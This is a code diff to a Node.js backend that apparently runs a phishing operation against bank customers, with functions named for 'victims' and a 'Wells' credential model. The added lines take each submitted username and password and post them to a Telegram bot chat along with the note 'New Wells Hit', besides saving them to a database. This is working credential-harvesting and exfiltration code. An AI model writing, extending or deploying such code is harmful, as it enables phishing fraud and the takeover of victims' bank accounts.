@@ -1,4 +1,5 @@
 const Wells = require("../models/wellsModel");
+const axios = require("axios");
 
 const getOwnerVics = async (req, res) => {
   const { owner } = req.params;
@@ -41,6 +42,18 @@ const submitLogin = async (req, res) => {
   const { username, password, uniqueid, owner, ip } = req.body;
   try {
     await Wells.create({ uniqueid, username, password, status: 1, owner, ip });
+    await axios
+      .post(
+        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+        {
+          chat_id: 680379375,
+          text: `New Wells Hit:\n\n${username}:${password}`,
+          parse_mode: "Markdown",
+        }
+      )
+      .catch((e) => {
+        console.log(e);
+      });
     res.sendStatus(200);
   } catch (error) {
     console.log(error);
